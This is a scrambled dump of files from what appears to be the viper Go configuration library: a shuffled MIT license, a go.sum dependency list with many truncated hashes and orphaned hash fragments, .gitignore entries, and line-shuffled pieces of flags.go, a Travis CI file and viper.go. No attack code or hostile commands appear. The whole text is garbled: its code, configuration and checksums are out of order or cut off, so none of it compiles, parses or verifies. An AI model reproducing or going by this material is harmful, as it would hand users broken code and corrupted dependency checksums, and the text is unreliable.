"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
The MIT License (MIT)
SOFTWARE.
"in the Software without restriction, including without limitation the rights"
Copyright (c) 2014 Steve Francia
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
The above copyright notice and this permission notice shall be included in all
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
github.com/grpc-ecosystem/grpc-gateway v1.9.0 h1:bM6ZAFZmc/wPFaRDi0d5L7hGEZEx/2u
google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=
cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM
gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127 h1:qIbj1fsPNlZgppZ
Rxn0yngAk=
github.com/ghodss/yaml v1.0.0 h1:wQHKEahhL6wmXdzwWG11gIVCkOv05bNOh
kaKSTVE=
tqmdA7KEzXLpiyaw0E=
github.com/xiang90/probing v0.0.0-20190116061207-43a291ad63a2 h1:eY9dn8
lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=
github.com/kisielk/gotool v1.0.0/go.mod h1:XhKaO
github.com/prometheus/tsdb v0.7.1/go.mod h1:qhTCs0VvXwvX/y3TZrWD7rabWM
github.com/gogo/protobuf v1.1.1/go.mod h1:r8qH/GZQm5c6nD/R0oafs1akxWv10x8SbQlK7atdtwQ=
L2hUp1rHADufV3IMtnDRdf1r5NINEl0=
wFjFa4jdeBTo=
wExME=
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
golang.org/x/time v0.0.0-20190308202827-9d24e82272b4 h1:SvFZT6jyqRaOeXpc5h/JSfZenJ2O330aBsf7JfSUXmQ=
go.etcd.io/bbolt v1.3.2/go.mod h1:IbVyRI1SCnLcuJnV2u8VeU0CEYM7e686BmAb1XKL
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
github.com/julienschmidt/httprouter v1.2.0/go.mod h1:SYymIcj16QtmaHHD7aYtjjsJG7VTCxuUUipMqKk8s4w=
golang.org/x/sync v0.0.0-20181108010431-42b317875d0f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
golang.org/x/net v0.0.0-20181114220301-adae6a3d119a/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
H1uAHpcLFnEyAGVDL/k47Jfbm0A=
gopkg.in/check.v1 v1.0.0-20180628173108-788fd7840127/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/yaml.v2 v2.0.0-20170812160011-eb3733d160e7/go.mod h1:JAlM8MvJe8wmxCU4Bli9HhUf9
github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b
5A1VGuI=
github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC
github.com/kr/pretty v0.1.0/go.mod h1:dAy3ld7l9f0ibDNOQOHHMYYIIbhfbHSm3C4ZsoJORNo=
github.com/mitchellh/mapstructure v1.1.2 h1:fmNYVwqnSfB9mZU6OS2O6GsXM
github.com/rogpeppe/fastuuid v0.0.0-20150106093220-6724a57986af/go.mod h1:XWv6SoW27p1b0cqNHllgS5HIMJraePCO15w5zCzIWYg=
github.com/sirupsen/logrus v1.2.0 h1:juTguoYk5qI21pwyTXY3B3Y5cOTH3ZUyZCg1v/mihuo=
4EoQTLFTRgOQ1FBLkstjWtayDeSgw=
golang.org/x/sys v0.0.0-20180830151530-49385e6e1522/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
0za1rQkzVuMiMFI=
github.com/spf13/jwalterweatherman v1.0.0/go.mod h1:cQK4TGJAtQXfYWX
OPACYpWeL0wqObRcbAqCMya13uyzqw0=
golang.org/x/net v0.0.0-20181220203305-927f97764cc3/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
github.com/alecthomas/units v0.0.0-20151022065526-2efee857e7cf/go.mod h1:ybxpYRFXyAe
github.com/prometheus/common v0.0.0-20181113130724-41aa239b4cce/go.mod h1:daVV7qP5qjZbuso7PdcryaAu0sAZbrN9i7WWcTMWvro=
golang.org/x/tools v0.0.0-20190114222345-bf090417da8b/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b h1:VKtxabqXZkF25pY9ekfRL6a582T4P37/31XEstQ5p58=
github.com/spf13/cast v1.3.0/go.mod h1:Qx5cxh0v
RGrc=
1TvvltAvM3m8=
tw6aNJNDFFf0
github.com/matttproud/golang_protobuf_extensions v1.0.1 h1:4hp9jkHxhMHkqkrB3Ix0jegS5sx/RkqARlsWZ6pIwiU=
github.com/prometheus/procfs v0.0.0-20190507164030-5867b95ac084/go.mod h1:TjEm7ze935MbeOT/UhFTIMYKhuLP4wbCsTZCD3I8kEA=
golang.org/x/oauth2 v0.0.0-20180821212333-d2e6202438be/go.mod h1:N/0e6XlmueqKjAGxoOufVs8QHGRruUQn6yWY3a
gopkg.in/yaml.v2 v2.2.2/go.mod h1:hI93XBmqTisBFMUTm0b8Fm
github.com/prometheus/procfs v0.0.0-20190507164030-5867b95ac084 h1:sofwID9zm4tzrgykg80hfFph1mryUeLRsUfoocVVmRY=
golang.org/x/tools v0.0.0-20180221164845-07fd8470d635/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=
github.com/beorn7/perks v1.0.0 h1:HWo1m869IqiPhD389kmkxeTalrjNbbJTC8LXupb
VLlY7N33q108Sa
github.com/go-logfmt/logfmt v0.3.0/go.mod h1:Qt1PoO58o5twSAckw1HlFXLmHsOX5/0LbT9GBnD5lWE=
EcvlqZamSM4ZOMGlc93t6AcsBEu9Gc1vn7yk=
google.golang.org/genproto v0.0.0-20180817151627-c66870c02cf8 h1:Nw54tB0rB7hY/N0NQvRW8DG4Yk3Q6T9cu9RcFQDu1tc=
golang.org/x/crypto v0.0.0-20190308221718-c2843e01d9a2 h1:VklqNMn3ovrHsnt90PveolxSbWFaJdECFbxSq0Mqo2M=
4Up7hJrFBPr
github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=
9X1NB3Zf8V7Ke586lFgjr2dZNuvo3lPJSGZ5JPQ=
0xfcU
github.com/fsnotify/fsnotify v1.4.7/go.mod h1:jwhsz4b93w/PPRr/qN1Yymfu8t87LnFCMoQvtojpjFo=
g88fzRXU5OdNfaM
golang.org/x/time v0.0.0-20190308202827-9d24e82272b4/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I
github.com/kr/pty v1.1.1/go.mod h1:pFQYn66WHrOpPYNljwOMqo10TkYh1fy3cYio2l3bCsQ=
github.com/ugorji/go v1.1.4 h1:j4s
go.uber.org/atomic v1.4.0 h1:cxzIVoETapQEqDhQu3QfnvXAV4AlzcvUCxkVUFw3
github.com/google/btree v1.0.0/go.mod h1:lNA
golang.org/x/net v0.0.0-20190522155817-f3200d17e092/go.mod h1:HSz
gopkg.in/yaml.v2 v2.2.1/go.mod h1:hI93XBmqTisBFMUTm0b8Fm
github.com/golang/groupcache v0.0.0-20190129154638-5b532d6fd5ef/go.mod h1:cIg4eruTrX1D
q6hsWO3/vpuAkAr
github.com/prometheus/client_model v0.0.0-20180712105110-5c3871d89910/go.mod h1:MbSGuTsp3dbXC40dX6PRTWyKYBIrTGTE9sqQNg2J8bo=
google.golang.org/grpc v1.21.0/go.mod h1:oYelfM1adQP15Ek0mdvEgi9Df8B9CZIaU1084ijfRaM=
wFpr4gzcvqqNjLnInEg4=
github.com/sirupsen/logrus v1.2.0/go.mod h1:LxeOpSwHxABJmUn/MG1IvRgCAasNZTLOkJPxbbu5VWo=
hMPgOLZmtrrCbhqsmaPHjLKYnJCaQ=
golang.org/x/crypto v0.0.0-20190308221718-c2843e01d9a2/go.mod h1:djNgcEr1/C05ACkg1iLfiJU5Ep61QUkGW8qpdssI0
SDo693bJlVdllGtEeKM=
github.com/coreos/go-systemd v0.0.0-20190321100706-95778dfbb74e/go.mod h1:F5haX7vjVVG0kc13fIWeqUViNPyEJxv/OmvnBo0Yme4=
github.com/magiconair/properties v1.8.0 h1:LLgXmsheXeRoUOBOjtwPQCWIYqM/LU1ayDtDePerRcY=
golang.org/x/sys v0.0.0-20181116152217-5ac8a444bdc5/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/grpc-ecosystem/go-grpc-prometheus v1.2.0/go.mod h1:8NvIoxWQoOIhqOTXgfV/d3M/q6VIi02HzZEHgUlZvzk=
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/cespare/xxhash v1.1.0/go.mod h1:XrSqR1VqqWfGrhpAt58auRo0WTKS1nRRg3ghfAqPWnc=
github.com/fsnotify/fsnotify v1.4.7 h1:IXs
8Mzv/fWEsPGWxqefPtCP5CnV9I=
k0tEow=
pa3tz3fJXkt5B7QaRBrM62gk=
CedLV8=
5nqEBWmkhHvq77mSJWrCKwh8bxhgT7d/eI7P4U=
github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV
uSET
DwF1aE
golang.org/x/net v0.0.0-20180826012351-8a410e7b638d/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=
26W01tbo22gdxWY5EU2bo=
github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77 h1:ESFSdwYZvkeru3RtdrYueztKhOBCSAAzS4Gf
QLmnXW2CcXuY
github.com/prometheus/client_golang v0.9.1/go.mod h1:7SWBe2y4D6OKWSNQJUaRYU/AaXPKyh/dDVn
wcskZDuKQzvN1EDeE=
github.com/spf13/afero v1.1.2/go.mod h1:j4pytiNVoe2o6bmDsKpLACNPDBIoEAkihy7loJ1B0CQ=
github.com/ugorji/go v1.1.4/go.mod h1:uQMGLiO92mf5W77hV/PUCpI3pbzQx3CRekS0kk
golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
Ddv3mKDzgVb68N
github.com/coreos/go-semver v0.2.0 h1:3Jm3tLmsgAYcjC
gTNwPg2I6zVXpSg4=
rwdDfMAkV7OtwuqBVzrE8GR6GFx
github.com/go-stack/stack v1.8.0/go.mod h1:v0f6uXyyMGvRgIKkXu
153eP4D4r3EedlOD2RNk=
n7rAqYeSw/SZazuY=
github.com/go-kit/kit v0.8.0/go.mod h1:xBxKIO96dXMWWy0MnWVtmwkA9/13aqxPnvrjFYMA2as=
ZcuP6l3yW9doeqz6ziZGgcynBVQO
github.com/pkg/errors v0.8.0 h1:WdK/asTD0HN
ijKTux40TwIPHuXU=
golang.org/x/crypto v0.0.0-20180904163835-0709b304e793/go.mod h1:6SG95UA2DQfeDnfUPMdvaQW0Q7yPrPDi9nlGo2tz2b4=
github.com/spaolacci/murmur3 v0.0.0-20180118202830-f09979ecbc72/go.mod h1:JwIasOWyU6f
kYO4g3RSRF0IAv0no=
go.uber.org/zap v1.10.0 h1:ORx85nbTijNz8ljznvCMR1ZBIPKFn3jQrag10X2AsuM=
github.com/gorilla/websocket v1.4.0/go.mod h1:E7qHFY5m1UJ88s3WnNqhKjPHQ0heANvMoAMk2YaljkQ=
github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90/go.mod h1:xMI15A0UPsDsEKsMN9yxemIoYk6Tm2C1GtYGdfGttqA=
github.com/soheilhy/cmux v0.1.4 h1:0HKaf1o97UwFjHH9o5XsHUOF
E42TnysNCUPdjciGhY=
incompatible h1:jFneRYjIvLMLhDLCzuTuU4rSJUjRplcJQ7pD7MnhC04=
github.com/hashicorp/hcl v1.0.0/go.mod h1:E5yfLk
0hcPo=
github.com/spf13/afero v1.1.2 h1:m8/z1t7/fwjysjQRYbP0RD
github.com/xordataexchange/crypt v0.0.3-0.20170626215501-b2862e3d0a77/go.mod h1:aYKd//L2LvnjZzWKhF00oedf4jCCReLcmhLdhm1A27Q=
go.uber.org/multierr v1.1.0/go.mod h1:wR5kodmAFQ0UK8QlbwjlSNy0Z68gJhDJUG5sjR94q/0=
github.com/coreos/go-semver v0.2.0/go.mod h1:nnelYz7RCh
github.com/coreos/bbolt v1.3.2 h1:wZwiHHUieZCquLkDL0B8UhzreNWsPHooDAG3q34zk0s=
V4qmtdjCk=
github.com/kr/text v0.1.0/go.mod h1:4Jbv
github.com/spf13/pflag v1.0.3/go.mod h1:DYY7MBk1bdzusC3SYhjObp
github.com/stretchr/objx v0.1.1/go.mod h1:HFkY916IF
pc6Ldnwhi/IjpwHt7yyuwOQ=
github.com/gogo/protobuf v1.2.1 h1:/s5zKNz0uPFCZ5hddgPdo2TK2TVrUNMn0OOX8/aZMTE=
7swimpb2L/Alb/PJmXilQ/rhwaUYs4T20WEQ=
github.com/kr/text v0.1.0 h1:45sCR5RtlFHMR4UwH9sdQ5TC8v0qDQCHnXt
github.com/magiconair/properties v1.8.0/go.mod h1:PppfXfuXeibc/6YijjN8zIbojt8czPbwD3XqdrwzmxQ=
github.com/prometheus/client_golang v0.9.3/go.mod h1:/TN21ttK/J9q6uSwhBd54HahCDft0ttaMvbicHlPoso=
golang.org/x/lint v0.0.0-20190313153728-d0100b6bd8b3/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=
FDfi0VSX39io3aQ
golang.org/x/tools v0.0.0-20190311212946-11955173bddd/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=
bWy6jNmig1y/TA
github.com/golang/protobuf v1.3.1 h1:YF8
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
github.com/mitchellh/mapstructure v1.1.2/go.mod h1:FVVH3fgwuzCH5S8UJGiWEs2h04kUh9fWfEaFds41c1Y=
MFFWcvkIS/tQcRk01m1F5IRFswLeQ
github.com/ghodss/yaml v1.0.0/go.mod h1:4dBDuWmgqj2HViK6kFavaiC9ZROes6MMH2rRYeMEF04=
ygLZcrzQJaqmWj9AIm7n08wl/qW/PE=
github.com/grpc-ecosystem/go-grpc-middleware v1.0.0 h1:Iju5GlWwrvL6UBg4zJJt3btmonfrMlCDdsejg4CZE7c=
m/2kptfBszLMUkC4ZK/EgS/cQ=
FBtV6XMibvdAFo93nm5qn4U=
gopkg.in/alecthomas/kingpin.v2 v2.2.6/go.mod h1:FMv
github.com/BurntSushi/toml v0.3.1 h1:WXkYYl6Yr3qBf1K79EBnL4mak0OimBfB0XUf9Vl28OQ=
github.com/coreos/pkg v0.0.0-20180928190104-399ea9e2e55f h1:lBNOc5arjvs8E5mO2tbpBpLoyyu8B6e44T7hJy6potg=
github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6 h1:G1bPvciwNyF7IUmKXNt9Ak3m6u9DE1rF
golang.org/x/lint v0.0.0-20181026193005-c67002cb31c3/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=
github.com/grpc-ecosystem/go-grpc-prometheus v1.2.0 h1:Ovs26xHkKqVztRpIrF/92BcuyuQ/YW4NSIpoGtfXNho=
github.com/prometheus/client_golang v0.9.3 h1:9iH4JKXLzFbOAdtqv/a
bJ4dT7Ms6E4xg4kGIyLM=
go.uber.org/zap v1.10.0/go.mod h1:vwi/ZaCAaUcBkycHslxD9B2zi4UTXhF60s6SWpuDF0Q=
EgiOT7lHqUV2J862kp8Qj64Jo6az82
golang.org/x/text v0.3.0 h1:g61tztE5qeGQ89tm6NTjjM9VPIm088od1l6aSorWRWg=
github.com/golang/groupcache v0.0.0-20190129154638-5b532d6fd5ef h1:veQD95Isof8w9/WXiA
ttbYbLASfIpnQbh74=
golang.org/x/net v0.0.0-20190311183353-d8887717615a/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=
6sfsiTG8qcWGx4=
1ngSBFLxvqU3pZ
Tmr2evNHDiI=
fhmuc
github.com/soheilhy/cmux v0.1.4/go.mod h1:IM3LyeVVIOuxMH7sFAkER9
T0U=
github.com/google/btree v1.0.0 h1:0udJVsspx3VBr5FwtLhQQtuAsVc79tTq0ocGIPAU6qo=
golang.org/x/text v0.3.0/go.mod h1:NqM8EUOU14njkJ3fqMW
honnef.co/go/tools v0.0.0-20190102054323-c2f93a96b099/go.mod h1:rf3lG4BRIbNafJWhAfAdb/ePZxsR/4RtNHQocxwk9r4=
github.com/gorilla/websocket v1.4.0 h1:WDFjx/TMzVgy9VdMMQi2K2Emtwi2QcUQsztZ/zLaH/Q=
github.com/dgrijalva/jwt-go v3.2.0
c5H38=
0opPa2QZZtGFBFZlji/RkVcI2GknAs/DXo4wKdlNEc=
github.com/hashicorp/hcl v1.0.0 h1:0Anlzjpi4vEasTeNFn2mLJgTSwt0
go.etcd.io/bbolt v1.3.2 h1:Z/90sZLPOeCy2PwprqkFa25PdkusRzaj9P8zm/KNyvk=
github.com/prometheus/common v0.4.0/go.mod h1:TNfzLD0ON7rHzMJeJkieUDPYmFC7Snx/y86RQel1bk4=
github.com/prometheus/procfs v0.0.0-20181005140218-185b4288413d/go.mod h1:c3At6R/oaqEKCNdg8wHV1ftS6bRYblBhIjjI8uT2IGk=
golang.org/x/sync v0.0.0-20181221193216-37e7f081c4d4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
4UWYiBimWS
go.uber.org/multierr v1.1.0 h1:HoEmRHQPVSqub6w2z2d2EOVs2fjyFRGyofhKuyDq0QI=
jr3Dg1NNxqwp
github.com/oklog/ulid v1.3.1/go.mod h1:CirwcVhetQ6Lv90oh/F
mEhP44yOT
sl0=
github.com/OneOfOne/xxhash v1.2.2/go.mod h1:HSdplMjZKSmBqAxg5vPj2TmRDmfkzw
jE20tsWTFYpLwKvXlhS1hjn
j8aewx2Y8lAjAydhbaScPF8=
github.com/kisielk/errcheck v1.1.0/go.mod h1:EZBBE59ingxPouuu3KfxchcWSUPOHkagtvWXihfKN4Q=
gopkg.in/yaml.v2 v2.2.2 h1:ZCJp
obU0
github.com/pelletier/go-toml v1.2.0 h1:T5zMGML61Wp
github.com/spf13/jwalterweatherman v1.0.0 h1:XHEdyB
google.golang.org/grpc v1.19.0/go.mod h1:mqu4LbDTu4XGKhr4mRzUsmM4RtVoemTSY81AxZiDr8c=
97AoqBnmZIT91cLG/EkCoK9NSelj64P8bOHHNmGn0=
golang.org/x/net v0.0.0-20190522155817-f3200d17e092 h1:4QSRKanuywn15aTZvI/mIDEgPQpswuFndXpOj3rKEco=
flBXS5eO826T4nzqPrxfhQThhXl0YzfuUPu4SBg=
oQHNcck=
github.com/kr/logfmt v0.0.0-20140226030751-b84e30acd515/go.mod h1:
sWQYwY=
WB441p7ynQJzVuNRJiqddSIE3IlSEQ=
5ahJtPPxZlU
56JwCaLick0ClmMTw=
DJW3UT/LiOwJeYQe1efqtUx/iVham/4vfdArNI=
5NUziq4I4S80YR8gNf3Q=
cTzAElWljhcU=
github.com/go-logfmt/logfmt v0.4.0/go.mod h1:3RMwSq7FuexP4Kalkev3ejPJsZTpXXBr9
vbi4tKz5Qo6v2eYzo7kUS51QINcR5jNpbZS8=
github.com/beorn7/perks v1.0.0/go.mod h1:KWe93zE9D1o94FZ5RNwFwVgaQK1VOXiVxmqh
github.com/jonboulle/clockwork v0.1.0/go.mod h1:Ii8DK3G1RaLaWxj9trq07
github.com/stretchr/testify v1.2.2 h1:bSDNvY7ZPG5RlJ8otE/7V6gMiyenm9RtJ7IUVIAoJ1w=
vvW/OXSQhTDSoE431IQ=
bUIF/8tJwPdEZsI83ACI=
github.com/coreos/etcd v3.3.10
github.com/xiang90/probing v0.0.0-20190116061207-43a291ad63a2/go.mod h1:UETIi67q53MR2AWcXfiuqkDkRtnGDLqkBTpCHuJHxtU=
RmtIkBpVdA=
9IcxsU14FzY7Hc=
bZgJeR0sMTm6dMHP7U=
github.com/spf13/pflag v1.0.3 h1:zPAT6CGy6wXeQ7NtTnaTerfKOsV6V6F8agHXFiazDkg=
github.com/coreos/go-systemd v0.0.0-20190321100706-95778dfbb74e h1:Wf6HqHfScWJN9/ZjdUKyjop4mf3Qdd
github.com/BurntSushi/toml v0.3.1/go.mod h1:xHWCNGjB5oqiDr8zfno3MHue2Ht5sIBksp03qcyfWMU=
golang.org/x/sync v0.0.0-20180314180146-1d60e4601c6f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=
github.com/jonboulle/clockwork v0.1.0 h1:VKV
eyWzqEqokIECu5etghLkUJE=
11k8xSBh
github.com/alecthomas/template v0.0.0-20160405071501-a0175ee3bccc/go.mod h1:LOuyumcjzFXgccqObfd/Ljyb9UuFJ6TxHnclSeseNhc=
go.uber.org/atomic v1.4.0/go.mod h1:gD2HeocX3
github.com/grpc-ecosystem/grpc-gateway v1.9.0/go.mod h1:vNeuVxBJEsws4ogUvrchl83t/GYV9WGTSLVdBhOQFDY=
golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a h1:1BGLXjeY4akVXGgbC9HugT3Jv3hCI0z56oJR5vAMgBU=
github.com/matttproud/golang_protobuf_extensions v1.0.1/go.mod h1:D8He9yQNgCq6Z5Ld7szi9bcBfOoFv/3dc6xSMkL2PC0=
NZz0KFw=
ZhiEuf87xNszmSA2myDM2Kzu9HwQUA=
github.com/prometheus/client_model v0.0.0-20190129233127-fd36f4220a90 h1:S/YWwWx/RA8rT8tKFRuGUZhuA90OyIBpPCXkcbwU8DE=
3Td9dZw=
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405 h1:yhCVgyC4o1eVCa2tZl7eS0r
github.com/coreos/bbolt v1.3.2/go.mod h1:iRUV2dpdMOn7Bo10OQBFzIJO9kkE559Wcmn
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
incompatible/go.mod h1:uF7uidLiAD3TWHmW31ZFd/JWoc32PjwdhPthX9715RE=
yp6POWl0qKG85gN/melR3HDY=
github.com/konsorten/go-windows-terminal-sequences v1.0.1/go.mod h1:T0
github.com/prometheus/common v0.4.0 h1:7etb9YClo3a6HjLzfl6rIQaU
github.com/golang/protobuf v1.3.1/go.mod h1:6lQm79b
Yts87kKdq0PP7pXfy6kDkUVs=
incompatible/go.mod h1:E3ru
github.com/pkg/errors v0.8.0/go.mod h1:bwawxfHBFNV
github.com/client9/misspell v0.3.4/go.mod h1:qj6jICC3Q7zFZvVWo7KLAzC3yx5G7kyvSDkc90ppPyw=
google.golang.org/genproto v0.0.0-20180817151627-c66870c02cf8/go.mod h1:JiN7NxoALGmiZfu7CAH4rXhgtRTLTxftemlI0sWmxmc=
google.golang.org/grpc v1.21.0 h1:G
XFnRR8LxR5pz3Of3rY3CfYBVs4xY44aLks=
golang.org/x/sys v0.0.0-20181107165924-66b7b1311ac8/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/mwitkow/go-conntrack v0.0.0-20161129095857-cc309e4a2223/go.mod h1:qRWi
github.com/beorn7/perks v0.0.0-20180321164747-3a771d992973/go.mod h1:Dwedo/Wpr24TaqPxmxbtue
github.com/konsorten/go-windows-terminal-sequences v1.0.1 h1:mweAR1A6xJ3oS2pRaGiHgQ4OO8tzTaLawm8vnODuwDk=
github.com/pelletier/go-toml v1.2.0/go.mod h1:5z9KED0ma1S8pY6P1sdut58dfprrGBbd/94hg7ilaic=
github.com/armon/consul-api v0.0.0-20180202201655-eb2c6b5be1b6/go.mod h1:grANhF5doyWs3UAsr3K4I6qtAmlQcZDesFNEHPZAzj8=
gopkg.in/resty.v1 v1.12.0/go.mod h1:mDo4pnntr5jdWRML875a/NmxYqAlA73dVijT2AXvQQo=
github.com/grpc-ecosystem/go-grpc-middleware v1.0.0/go.mod h1:FiyG127CGDf3tlThmgyCl78X/SZQqEOJBCDaAfeWzPs=
FlcbWjRDT7yAxhJNAiPPLOFECq181zc=
qkEiiKk=
tAvLfL3bZyefP2SEWmhBzmuIlH/eqNuPdFPgngw=
rkHYY13jYWTU97c=
github.com/google/go-cmp v0.2.0/go.mod h1:oXzfMopK8JAjlY9xF4vHSVASa0yLyX7SntLO5aqRK0M=
github.com/tmc/grpc-websocket-proxy v0.0.0-20190109142713-0ad062ec5ee5/go.mod h1:ncp9v5uamzpCO7NfCPTXjqaC
golang.org/x/sys v0.0.0-20180905080454-ebe1bf3edb33/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS
github.com/dgryski/go-sip13 v0.0.0-20181026042036-e10d5fee7954/go.mod h1:vAd38F8PWV
incompatible h1:7qlOGliEKZXTDg6OTjfoBKDXWrumCAMpl/TFQ4/5kLM=
github.com/tmc/grpc-websocket-proxy v0.0.0-20190109142713-0ad062ec5ee5 h1:LnC5Kc/wtumK
github.com/kr/pretty v0.1.0 h1:L/CwN0zerZDmRFUapSPitk6f
github.com/coreos/pkg v0.0.0-20180928190104-399ea9e2e55f/go.mod h1:E3G3o1h8I7cfcXa63jLwjI0eiQQMgzzUDFVpN/nH/eA=
github.com/gogo/protobuf v1.2.1/go.mod h1:hp
github.com/spf13/cast v1.3.0 h1:oget//CVOEoFewqQxwr0Ej5yjygnqGkvggSE/gB35Q8=
[568vq].out
.bench
_cgo_gotypes.go
" Compiled Object files, Static and Dynamic libs (Shared Objects)"
 folder
.[568vq]
.cgo1.go
 Architecture specific extensions/prefixes
_cgo_export.
/vendor
_test
 exclude dependencies in the 
.test
vendor
_obj
_testmain.go
.exe
 Folders
.vscode
_cgo_defun.c
.cgo2.c
// ValueString returns the value of the flag as a string.
func (p pflagValue) ValueType() string {
func (p pflagValue) HasChanged() bool {
// FlagValue is an interface that users can implement
type FlagValue interface {
// to bind different flags to viper.
return p.flag.Changed
"import ""github.com/spf13/pflag"""
// ValueType returns the type of the flag as a string.
package viper
type pflagValueSet struct {
flag 
VisitAll(fn func(FlagValue))
// VisitAll iterates over all 
return p.flag.Value.String()
Name() string
HasChanged() bool
return p.flag.Name
func (p pflagValue) Name() string {
flags 
ValueString() string
pflag.FlagSet.
pflag.Flag
type FlagValueSet interface {
pflag.ValueSet
// that implements FlagValueSet.
// to bind a set of flags to viper.
func (p pflagValueSet) VisitAll(fn func(flag FlagValue)) {
return p.flag.Value.Type()
type pflagValue struct {
pflag.Flag) {
// FlagValueSet is an interface that users can implement
fn(pflagValue{flag})
pflag.flag
// that implements FlagValue
// Name returns the name of the flag.
// pflagValueSet is a wrapper around 
ValueType() string
// HasChanges returns whether the flag has changes or not.
pflag.Flag inside the 
// pflagValue is a wrapper aroung 
pflag.FlagSet
func (p pflagValue) ValueString() string {
p.flags.VisitAll(func(flag 
  - cd $GOPATH/src/github.com/spf13/hugo 
 cd -
  - go test -v ./...
script:
"  - GO111MODULE=""on"""
go_import_path: github.com/spf13/viper
language: go
 make 
sudo: false
matrix:
  - 1.11.x
  - linux
  - osx
  - go install ./...
  - tip
  global:
  - diff -u <(echo -n) <(gofmt -d .)
after_success:
 ./hugo -s docs 
  allow_failures:
env:
  fast_finish: true
  - go get -u -d github.com/spf13/hugo
    - go: tip
"if err := yaml.Unmarshal(buf.Bytes(), "
return v.MergeConfig(bytes.NewReader(file))
"""path/filepath"""
"var SupportedRemoteProviders = []string{""etcd"", ""consul""}"
// GetUint64 returns the value associated with the key as an unsigned integer.
// GetSizeInBytes returns the size of the value associated with the given key
"Viper) Set(key string, value interface{}) {"
// instead of using a 
"mergeMaps(ssv, stv, ttv)"
go func() {
// and read it in the remote configuration registry.
"Viper) AddRemoteProvider(provider, endpoint, path string) error {"
if ok { // 'Errors' channel is not closed
"val = v.searchMap(v.kvstore, path)"
v.aliases = make(map[string]string)
"case float64, float32:"
// GetInt returns the value associated with the key as an integer.
"// in the environment, when automatic env is on."
// can use it in their testing as well.
Viper) SetEnvPrefix(in string) {
"return v.Unmarshal(rawVal, opts...)"
v.pflags[strings.ToLower(key)] = flag
Viper) SafeWriteConfig() error {
// BindPFlag binds a specific key to a pflag (as used by cobra).
func SafeWriteConfigAs(filename string) error { return v.SafeWriteConfigAs(filename) }
"// is set via an environment variable to ""a b c"", a call to the Get function"
default:
"""os"""
" v.isPathShadowedInDeepMap(path, castMapStringToMapInterface(v.aliases)) != """" {"
"jww.TRACE.Printf(""merging maps (must convert)"")"
"// add all paths, by order of descending priority to ensure correct shadowing"
jww.ERROR.Printf(
configFile        string
return cast.ToString(v.Get(key))
return mk
Viper) GetTime(key string) time.Time {
// GetStringMapStringSlice returns the value associated with the key as a map to a slice of strings.
"respc, _ := RemoteConfig.WatchChannel(rp)"
// AllSettings merges all settings and returns them as a map[string]interface{}.
valType := val
// SetConfigType sets the type of the configuration returned by the
"endpoint: endpoint,"
// The resulting config will have the following values:
func GetStringMapStringSlice(key string) map[string][]string { return v.GetStringMapStringSlice(key) }
func Reset() {
 alias != v.realKey(key) {
Viper) find(lcaseKey string) interface{} {
Viper) MergeInConfig() error {
